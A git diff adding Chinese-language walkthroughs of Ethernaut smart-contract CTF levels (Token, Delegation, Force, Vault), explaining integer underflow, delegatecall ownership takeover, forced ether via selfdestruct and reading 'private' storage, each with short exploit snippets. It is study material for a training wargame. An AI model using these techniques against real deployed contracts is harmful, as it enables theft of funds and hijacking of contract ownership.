@@ -86,3 +86,111 @@ contract Exp_Telephone {
   }
 }
 ```
+
+## Token
+
+正整形数的下溢
+
+```solidity
+function transfer(address _to, uint _value) public returns (bool) {
+  require(balances[msg.sender] - _value >= 0);
+  balances[msg.sender] -= _value;
+  balances[_to] += _value;
+  return true;
+}
+```
+
+用户初始balances为20，只要向其他地址发送大于20的就会产生下溢，得到一个很大的数字。
+
+```javascript
+await contract.transfer("0x"+"0".repeat(40), 21)
+```
+
+## Delegation
+
+参考https://paper.seebug.org/633
+
+几种调用合约方法的区别：
+
+- call: msg 的值会修改，执行环境改变
+- delegatecall: msg 的值不会被修改，执行环境不变
+- callcode: msg 的值会被修改，执行环境不变
+
+delegatecall和callcode的执行环境不变，并不是变量名相同
+
+而是指在赋值的时候，该变量在此合约对应slot映射到原来合约的slot
+
+见 https://github.com/ethereum/solidity/issues/944
+
+其次这三个函数的调用方法都相同，均为：
+
+```solidity
+addr.call(bytes4(keccak256("test()")));  // no params
+addr.call(bytes4(keccak256("test(uint256)")), 10);  // with params
+```
+
+web3中的调用方法为：
+
+```javascript
+await contract.sendTransaction({data: web3.utils.sha3("pwn()").slice(0,10)});
+```
+
+## Force
+
+合约没有任何内容，challenge通过的条件为合约地址中余额大于0
+
+```javascript
+web3.eth.sendTransaction({from: player, to: contract.address, value: 1})
+```
+
+直接发送会失败。
+两种方法：
+
+- 创建一个合约并让它自毁，指定自毁后余额去向
+- 挖矿并将奖励接收地址设置为它
+
+payload：
+
+```solidity
+pragma solidity ^0.6.0;
+
+contract Force_exp {
+    constructor() payable public{}
+    
+    function exp(address aim) public{
+        selfdestruct(payable(aim));
+    }
+}
+```
+
+## Vault
+
+该challenge有一个被private修饰的password，需要获取password值。
+
+[官方文档](https://docs.soliditylang.org/en/latest/contracts.html?highlight=private#visibility-and-getters) 
+描述针对状态变量的三种visibility区别：
+
+- `public` can be either called internally or via messages. For public state variables, an automatic getter function (see below) is generated.
+- `internal` can only be accessed internally (i.e. from within the current contract or contracts deriving from it), without using this. This is the default visibility level for state variables.
+- `private` only visible for the contract they are defined in and not in derived contracts.
+
+下面还给了个note：
+
+>Everything that is inside a contract is visible to all observers external to the blockchain. Making something private only prevents other contracts from reading or modifying the information, but it will still be visible to the whole world outside of the blockchain.
+
+也就是说，private仅仅起到可以不被其他合约读取和修改，但还是属于链上公开信息。
+
+```solidity
+constructor(bytes32 _password) public {
+  locked = true;
+  password = _password;
+}
+```
+
+该合约在创建时，password是输入数据，因此顺着合约地址找到 [区块链浏览器](https://rinkeby.etherscan.io/) 上对应创建合约的这笔交易信息的State中可以看到对State的修改也即password的修改
+
+更好的做法是利用web3
+
+```javascript
+web3.utils.toAscii(await web3.eth.getStorageAt(contract.address, 1))
+```
